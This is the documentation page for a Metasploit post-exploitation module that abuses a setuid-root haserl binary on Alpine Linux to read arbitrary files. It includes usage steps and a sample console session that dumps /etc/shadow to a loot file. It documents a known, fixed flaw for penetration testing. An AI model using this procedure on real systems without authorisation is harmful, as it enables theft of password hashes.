## Vulnerable Application

[Haserl](http://haserl.sourceforge.net/) is an unmaintained tool to use LUA as CGI in web servers.
On Linux, when haserl is suid root, it will attempt to drop its privilege to the uid/gid of the owner of the cgi script,
similar to suexec in Apache.

Haserl could have been a thing of the past, but it's used in Alpine Linux'
[Alpine Configuration
Framework](https://wiki.alpinelinux.org/wiki/Alpine_Configuration_Framework_Design),
which is commonly used on this distribution.

This module exploits the fact that calling haserl on a file will make it not only change the effective UID,
but also display the content of the file.

This has been fixed in version 0.9.36.

### Prerequisites

1. Install Alpine Linux
2. Install haserl

## Verification Steps

1. Start msfconsole
2. Get a shell
3. Do: `use post/linux/gather/haserl_read`
4. Set `SESSION`
5. Do: `run` or `exploit`
6. **Verify** that the file was successfully downloaded

## Options

### RFILE

Remote file to download, defaults to `/etc/shadow`.


## Scenarios

```
msf6 > use post/linux/gather/haserl_read 
msf6 post(linux/gather/haserl_read) > show options 

Module options (post/linux/gather/haserl_read):

   Name     Current Setting         Required  Description
   ----     ---------------         --------  -----------
   RFILE    /etc/shadow             yes       File to read
   SESSION  1                       yes       The session to run this module on.

msf6 post(linux/gather/haserl_read) > run

[!] SESSION may not be compatible with this module.
[+] Found set-uid haserl: /usr/bin/haserl-lua53
[+] Shadow saved in: /home/user/.msf4/loot/20210301204020_default_192.168.138.113_haserl_shadow_107368.txt
[*] Post module execution completed
msf6 post(linux/gather/haserl_read) >
```

## Reference
1. https://twitter.com/steaIth/status/1364940271054712842
